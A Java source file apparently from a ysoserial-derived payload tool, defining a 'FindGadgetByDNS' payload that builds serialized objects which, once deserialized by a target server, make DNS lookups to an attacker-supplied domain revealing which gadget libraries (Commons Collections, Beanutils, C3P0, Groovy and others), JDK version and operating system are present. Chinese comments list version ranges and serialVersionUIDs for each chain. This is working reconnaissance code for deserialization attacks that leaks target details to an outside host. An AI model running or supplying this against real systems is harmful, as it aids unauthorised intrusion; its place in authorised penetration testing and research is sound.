package me.gv7.woodpecker.yso.payloads;

import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import java.util.*;

@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.KEZIBEI,Authors.C0NY1 })
public class FindGadgetByDNS implements ObjectPayload<Object> {
    private String dnsDomain;

    private static List<Object> list = new LinkedList<Object>();
    private static String[] defaultclass = {
        "CommonsCollections13567",
        "CommonsCollections24",
        "CommonsBeanutils2","C3P0",
        "AspectJWeaver",
        "bsh",
        "Groovy",
        "Becl",
        "Jdk7u21",
        "JRE8u20",
        "winlinux"};

    public Object getObject(final String dnsDomain) throws Exception {
        FindGadgetByDNS urldns2List = new FindGadgetByDNS(dnsDomain);
        return urldns2List.genClassList();
    }

    public FindGadgetByDNS(){}

    public FindGadgetByDNS(String dnsDomain){
        this.dnsDomain = dnsDomain;
    }

    public List<Object> genClassList() throws Exception {
        for (int i = 0; i < defaultclass.length; i++) {
            genClassList(i);
        }
        return list;
    }

    public void genClassList(int clazzType) throws Exception{
        switch (clazzType) {
            case 0:
                //CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
                HashMap cc31or321 = genFindClassByDNSGadget("http://cc31or321."+dnsDomain, "org.apache.commons.collections.functors.ChainedTransformer");
                HashMap cc322 = genFindClassByDNSGadget("http://cc322."+dnsDomain, "org.apache.commons.collections.ExtendedProperties$1");
                list.add(cc31or321);
                list.add(cc322);
                break;
            case 1:
                //CommonsCollections2/4链,需要4-4.0版本
                HashMap cc40 = genFindClassByDNSGadget("http://cc40."+dnsDomain,  "org.apache.commons.collections4.functors.ChainedTransformer");
                HashMap cc41 = genFindClassByDNSGadget("http://cc41."+dnsDomain,  "org.apache.commons.collections4.FluentIterable");
                list.add(cc40);
                list.add(cc41);
                break;
            case 2:
                //CommonsBeanutils2链,serialVersionUID不同,1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608
                HashMap cb17 = genFindClassByDNSGadget("http://cb17."+dnsDomain, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
                HashMap cb18x = genFindClassByDNSGadget("http://cb18x."+dnsDomain, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
                HashMap cb19x = genFindClassByDNSGadget("http://cb19x."+dnsDomain, "org.apache.commons.beanutils.BeanIntrospectionData");
                list.add(cb17);
                list.add(cb18x);
                list.add(cb19x);
                break;
            case 3:
                //c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为7387108436934414104
                HashMap c3p092x = genFindClassByDNSGadget("http://c3p092x."+dnsDomain, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
                HashMap c3p095x = genFindClassByDNSGadget("http://c3p095x."+dnsDomain, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
                list.add(c3p092x);
                list.add(c3p095x);
                break;
            case 4:
                //AspectJWeaver,需要cc31
                HashMap ajw = genFindClassByDNSGadget("http://ajw."+dnsDomain, "org.aspectj.weaver.tools.cache.SimpleCache");
                list.add(ajw);
                break;
            case 5:
                //bsh,serialVersionUID不同,2.0b4为4949939576606791809,2.0b5为4041428789013517368,2.0.b6无法反序列化
                HashMap bsh20b4 = genFindClassByDNSGadget("http://bsh20b4."+dnsDomain, "bsh.CollectionManager$1");
                HashMap bsh20b5 = genFindClassByDNSGadget("http://bsh20b5."+dnsDomain, "bsh.engine.BshScriptEngine");
                HashMap bsh20b6 = genFindClassByDNSGadget("http://bsh20b6."+dnsDomain, "bsh.collection.CollectionIterator$1");
                list.add(bsh20b4);
                list.add(bsh20b5);
                list.add(bsh20b6);
                break;
            case 6:
                //Groovy,1.7.0-2.4.3,serialVersionUID不同,2.4.x为-8137949907733646644,2.3.x为1228988487386910280
                HashMap groovy1702311 = genFindClassByDNSGadget("http://groovy1702311."+dnsDomain, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
                HashMap groovy24x = genFindClassByDNSGadget("http://groovy24x."+dnsDomain, "groovy.lang.Tuple2");
                HashMap groovy244 = genFindClassByDNSGadget("http://groovy244."+dnsDomain, "org.codehaus.groovy.runtime.dgm$1170");
                list.add(groovy1702311);
                list.add(groovy24x);
                list.add(groovy244);
                break;
            case 7:
                //Becl,JDK<8u251
                HashMap becl = genFindClassByDNSGadget("http://becl."+dnsDomain, "com.sun.org.apache.bcel.internal.util.ClassLoader");
                list.add(becl);
                break;
            case 8:
                //JDK<=7u21
                HashMap Jdk7u21 = genFindClassByDNSGadget("http://Jdk7u21."+dnsDomain, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
                list.add(Jdk7u21);
                break;
            case 9:
                //7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
                HashMap JRE8u20 = genFindClassByDNSGadget("http://JRE8u20."+dnsDomain, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
                list.add(JRE8u20);
                break;
            case 10:
                //windows/linux版本判断
                HashMap linux = genFindClassByDNSGadget("http://linux."+dnsDomain, "sun.awt.X11.AwtGraphicsConfigData");
                HashMap windows = genFindClassByDNSGadget("http://windows."+dnsDomain, "sun.awt.windows.WButtonPeer");
                list.add(linux);
                list.add(windows);
                break;
            default:
                break;
        }
    }

    public static HashMap genFindClassByDNSGadget(String url, String clazzName) throws Exception{
        FindClassByDNS findGadgetByDNS = new FindClassByDNS();
        return (HashMap) findGadgetByDNS.getObject(String.format("%s|%s",url,clazzName));
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(FindGadgetByDNS.class, args);
    }
}
